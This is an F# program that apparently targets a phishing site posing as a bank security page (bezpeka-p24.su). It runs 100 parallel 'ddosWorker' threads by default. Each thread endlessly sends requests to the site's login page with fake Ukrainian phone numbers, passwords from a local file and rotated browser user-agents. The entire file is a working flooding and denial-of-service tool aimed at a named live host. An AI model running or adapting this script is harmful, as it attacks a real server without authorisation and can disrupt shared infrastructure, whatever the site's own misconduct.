open System

open FSharp.Data

let mobileOperatorsCodes = ["50"; "95"; "99"; "63"; "66"; "67"; "68"; "91"; "92"]

let getRandomListElement (randomizer: Random) list = 
    list
    |> List.item (randomizer.Next(0, list.Length))

let toStr a = a.ToString()

let generatePhones getRandomListElement = 
    let r = new Random()
    seq {
        while true do
            let mobileOperatorCode = mobileOperatorsCodes |> (getRandomListElement r)
            yield
                sprintf "%s380+(%s)+%s-%s-%s"
                    "%2B"
                    mobileOperatorCode
                    (r.Next(100, 999) |> toStr)
                    (r.Next(10, 99) |> toStr)
                    (r.Next(10, 99) |> toStr)
    }

type RequestBody = 
    {
        PhoneNumber: string
        Password: string
    }

let userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36"
    ]

let sendRequest (randomizer: Random) threadNumber requestNumber request = async {
    printfn "Thread #%i is sending request #%i" threadNumber requestNumber
    let body = 
        sprintf "phone=%s&password=%s" request.PhoneNumber request.Password
        |> HttpRequestBody.TextRequest 

    let headers = [
            "Accept", "application/json, text/javascript, */*; q=0.01"
            "Accept-Encoding", "gzip, deflate"
            "Accept-Language", "en-US,en;q=0.9,ru;q=0.8,ru-UA;q=0.7,uk;q=0.6"
            "Cache-Control", "no-cache"
            "Content-Type", "application/x-www-form-urlencoded; charset=UTF-8"
            "Host", "bezpeka-p24.su"
            "Origin", "http://bezpeka-p24.su"
            "Pragma", "no-cache"
            "Referer", "http://bezpeka-p24.su/"
            "User-Agent", (userAgents |> getRandomListElement randomizer)
            "X-Requested-With", "XMLHttpRequest"]
    
    let customizeHttpRequest (config: Net.HttpWebRequest) = 
        config.AllowAutoRedirect <- false
        config

    let! _ = Http.AsyncRequest("http://bezpeka-p24.su/login.php", headers=headers, httpMethod="GET", customizeHttpRequest=customizeHttpRequest, silentHttpErrors=true)

    let! _ = Http.AsyncRequest("http://bezpeka-p24.su/login.php", headers=headers, httpMethod="POST", body=body, customizeHttpRequest=customizeHttpRequest, silentHttpErrors=true)
    ()
}

type Args = 
    {
        ThreadsCount: int
    }
let defaultArgs = { ThreadsCount = 100 }

let (|Int|_|) (str: string) = 
    let mutable v = 0
    match Int32.TryParse(str, &v) with
    | true -> Some v
    | false -> None

[<EntryPoint>]
let main argv =
    printfn "%A " argv
    let rec parseArgs args parsed = 
        match args with
        | [] -> parsed
        |   "--threads-count" :: (Int tc) :: etc |
            "-tc" :: (Int tc) :: etc -> parseArgs etc { parsed with ThreadsCount = tc }
        | _ ->  printfn "Wrong arguments have been specified."
                exit 1

    let args = parseArgs (argv |> List.ofArray) defaultArgs

    let passwords = System.IO.File.ReadAllLines "./passwords.txt" |> List.ofArray
    let r = new Random()

    let generateRequests phone = 
        {
            PhoneNumber = phone
            Password = passwords |> (getRandomListElement r)
        }

    let ddosWorker threadNumber = async {
            generatePhones getRandomListElement
            |> Seq.map generateRequests
            |> Seq.mapi (fun i request  -> sendRequest r threadNumber i request |> Async.RunSynchronously)
            |> List.ofSeq
            |> ignore
        }

    List.init (args.ThreadsCount) ddosWorker
    |> Async.Parallel
    |> Async.RunSynchronously
    |> ignore

    0
